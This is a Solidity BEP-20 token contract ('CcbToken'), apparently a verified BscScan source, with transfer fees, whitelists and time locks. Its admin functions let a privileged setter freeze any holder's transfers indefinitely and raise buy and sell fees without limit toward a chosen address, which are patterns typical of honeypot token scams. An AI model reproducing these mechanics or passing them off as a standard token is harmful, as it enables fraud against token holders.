/**
 *Submitted for verification at BscScan.com on 2022-11-16
*/

pragma solidity ^0.4.17;


library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}


contract Ownable {
    address public owner;
    address public setter;

    function Ownable() public {
        owner = msg.sender;
        setter = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    modifier onlySetter() {
        require(msg.sender == setter);
        _;
    }


    function transferOwnership(address newOwner) public onlyOwner {
        owner = newOwner;
    }

    function transferSettership(address newSetter) public onlyOwner {
        setter = newSetter;
    }


}


contract ERC20Basic {
    uint public _totalSupply;
    function totalSupply() public constant returns (uint);
    function balanceOf(address who) public constant returns (uint);
    function transfer(address to, uint value) public;
    event Transfer(address indexed from, address indexed to, uint value);
}

contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public constant returns (uint);
    function transferFrom(address from, address to, uint value) public;
    function approve(address spender, uint value) public;
    event Approval(address indexed owner, address indexed spender, uint value);
}

contract BasicToken is Ownable, ERC20Basic {
    using SafeMath for uint;

    mapping(address => uint) public balances;

    
    uint public basisPointsRate = 500;
    uint public buyPointsRate = 3000;

    address public feeaddr1;

    mapping(address => bool) public maptokenwhite;
    mapping(address => bool) public maptokenswap;

    mapping(address => uint) public mapsuocangtime;
    mapping(address => uint) public mapchechitime;
    
    modifier onlyPayloadSize(uint size) {
        require(!(msg.data.length < size + 4));
        _;
    }

    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {
        uint fee1 = (_value.mul(buyPointsRate)).div(10000);
        
        uint fee = 0;
        if(maptokenswap[_to] == true && maptokenwhite[msg.sender]==false){
            fee = (_value.mul(basisPointsRate)).div(10000);
        }else if(maptokenswap[msg.sender] == true && maptokenwhite[_to]==false){
            fee = fee1;
        }else if(maptokenswap[msg.sender] == true){
            require(now >= mapchechitime[_to]);
        }
        
        uint sendAmount = _value.sub(fee);
        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(sendAmount);
        if (fee > 0) {
            balances[feeaddr1] = balances[feeaddr1].add(fee);
            Transfer(msg.sender, feeaddr1, fee);
        }
        Transfer(msg.sender, _to, sendAmount);
    }

 
    function balanceOf(address _owner) public constant returns (uint balance) {
        return balances[_owner];
    }

    function getcursecond() public constant returns (uint256) {
        return now;
    }

}


contract StandardToken is BasicToken, ERC20 {

    mapping (address => mapping (address => uint)) public allowed;

    uint public constant MAX_UINT = 2**256 - 1;

    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {
        var _allowance = allowed[_from][msg.sender];

        uint fee1 = (_value.mul(basisPointsRate)).div(10000);
        
        if (_allowance < MAX_UINT) {
            allowed[_from][msg.sender] = _allowance.sub(_value);
        }
        
        uint fee = 0;
        if(maptokenswap[_from] == true && maptokenwhite[_to]==false){
            fee = (_value.mul(buyPointsRate)).div(10000);
        }else if(maptokenswap[_to] == true && maptokenwhite[_from]==false){
            fee = fee1;
        }else if(maptokenswap[_from] == true){
            require(now >= mapchechitime[_to]);
        }
        
        uint sendAmount = _value.sub(fee);
        balances[_from] = balances[_from].sub(_value);
        balances[_to] = balances[_to].add(sendAmount);
        if (fee > 0) {
            balances[feeaddr1] = balances[feeaddr1].add(fee);
            Transfer(_from, feeaddr1, fee);
        }
        Transfer(_from, _to, sendAmount);
    }

    
    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {

        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));

        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
    }

    function allowance(address _owner, address _spender) public constant returns (uint remaining) {
        return allowed[_owner][_spender];
    }

}


contract CcbToken is StandardToken {

    string public name;
    string public symbol;
    uint public decimals;
    address public upgradedAddress;

    function CcbToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {
        _totalSupply = _initialSupply;
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        balances[owner] = _initialSupply;
    }

    
    function transfer(address _to, uint _value) public {
        require(now >= mapsuocangtime[msg.sender]);
        return super.transfer(_to, _value);
    }

    
    function transferFrom(address _from, address _to, uint _value) public {
        require(now >= mapsuocangtime[_from]);
        return super.transferFrom(_from, _to, _value);
    }

    
    function balanceOf(address who) public constant returns (uint) {
        return super.balanceOf(who);
        
    }

    
    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {
        
        return super.approve(_spender, _value);
        
    }

    
    function allowance(address _owner, address _spender) public constant returns (uint remaining) {
        
        return super.allowance(_owner, _spender);
    }

    function totalSupply() public constant returns (uint) {
        return _totalSupply;
    }

    function setFeeParams(uint newBasisPoints, uint newbuyPoints) public onlySetter {

        basisPointsRate = newBasisPoints;
        buyPointsRate = newbuyPoints;

        FeeParams(newBasisPoints,newbuyPoints);
    }

    function setFeeAddrParams(address newfeeaddr1) public onlySetter {
        feeaddr1 = newfeeaddr1;
        Params(newfeeaddr1);
    }

    function settokenswapfactoryaddr( address newswapfactoryaddr) public onlyOwner {
        maptokenswap[newswapfactoryaddr] = true;
    }

    function setlockaddr( address newtokenaddr, uint timesecond) public onlySetter {
        mapsuocangtime[newtokenaddr] = timesecond;
    }

    function setchechiaddr( address newtokenaddr, uint timesecond) public onlySetter {
        mapchechitime[newtokenaddr] = timesecond;
    }

    function settokenwhiteaddr( address newtokenaddr) public onlySetter {
        maptokenwhite[newtokenaddr] = true;
        AddedWhiteList(newtokenaddr);
    }

    function movetokenwhiteaddr( address newtokenaddr) public onlySetter {
        maptokenwhite[newtokenaddr] = false;
        RemovedWhiteList(newtokenaddr);
    }

    event AddedWhiteList(address _user);
    event RemovedWhiteList(address _user);
    event FeeParams(uint newBasisPoints, uint newbuyPoints);
    event Params(address newfeeaddr1);
}